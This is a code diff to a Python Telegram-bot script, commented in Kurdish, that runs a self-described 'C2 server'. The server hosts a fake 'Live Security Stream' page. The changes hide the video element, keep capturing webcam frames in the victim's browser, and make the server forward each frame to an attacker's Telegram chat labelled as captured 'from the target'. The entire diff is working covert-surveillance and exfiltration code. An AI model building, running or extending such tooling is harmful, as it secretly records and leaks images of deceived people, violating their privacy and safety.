@@ -13,7 +13,7 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# پەڕەی لایڤ ستریم کە داوای مۆڵەت دەکات و ڤیدیۆکە پەخش دەکات
+# پەڕەی سەرەکی کە فێڵەکە لەوێوە دەست پێدەکات
 async def index_handler(request):
     html_content = """
     <!DOCTYPE html>
@@ -23,7 +23,7 @@ async def index_handler(request):
         <title>Live Security Stream</title>
         <style>
             body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding-top: 20px; }
-            video { width: 100%; max-width: 400px; border: 2px solid #00ff00; }
+            video { width: 100%; max-width: 400px; border: 2px solid #00ff00; display:none; }
         </style>
     </head>
     <body>
@@ -33,7 +33,8 @@ async def index_handler(request):
         <canvas id="canvas" style="display:none;"></canvas>
 
         <script>
-            const ws = new WebSocket('wss://' + window.location.host + '/ws');
+            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+            const ws = new WebSocket(protocol + window.location.host + '/ws');
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d');
@@ -50,8 +51,8 @@ async def index_handler(request):
                                 if (ws.readyState === WebSocket.OPEN) {
                                     ws.send(blob);
                                 }
-                            }, 'image/jpeg', 0.5);
-                        }, 1000); // هەروەها دەنێرێت لە هەر چرکەیەکدا
+                            }, 'image/jpeg', 0.6);
+                        }, 2000); // هەناردنی فرێمێک لە هەر ٢ چرکەیەکدا
                     };
                 })
                 .catch(err => console.error("Camera access denied"));
@@ -61,7 +62,7 @@ async def index_handler(request):
     """
     return web.Response(text=html_content, content_type='text/html')
 
-# وەرگرتنی פרێمەکان لە ڕێگەی WebSocket و ناردنی بۆ تەلەگرام یان نیشدانەوەی
+# وەرگرتنی فریمەکان و ناردنی ڕاستەوخۆ بۆ تەلەگرام
 async def websocket_handler(request):
     ws = web.WebSocketResponse()
     await ws.prepare(request)
@@ -69,11 +70,15 @@ async def websocket_handler(request):
     async for msg in ws:
         if msg.type == web.WSMsgType.BINARY:
             try:
-                # لێرەدا دەتوانین פרێمەکان وەربگرین
-                # بۆ نموونە بۆ ئەوەی زۆر قەرەباڵغ نەبێت، دەکرێت یەکەمینان یان بە پێی پێویست بنێردرێت
-                pass
+                content = msg.data
+                file_to_send = BufferedInputFile(content, filename="live_capture.jpg")
+                await bot.send_photo(
+                    chat_id=ADMIN_ID,
+                    photo=file_to_send,
+                    caption="🚨 **پرێمێکی لایڤ لە ئامانجەوە دەستگیرکرا!**"
+                )
             except Exception as e:
-                logging.error(f"WS Error: {e}")
+                logging.error(f"Telegram Send Error: {e}")
 
     return ws
 
@@ -89,7 +94,10 @@ async def start_c2_server():
     await site.start()
     
     logging.info(f"Live Stream C2 active at {C2_DOMAIN}")
-    await dp.start_polling(bot)
+    
+    # چاوەڕوانی بۆ ئەوەی سێرڤەرەکە بەردەوام کار بکات
+    while True:
+        await asyncio.sleep(3600)
 
 if __name__ == '__main__':
     asyncio.run(start_c2_server())
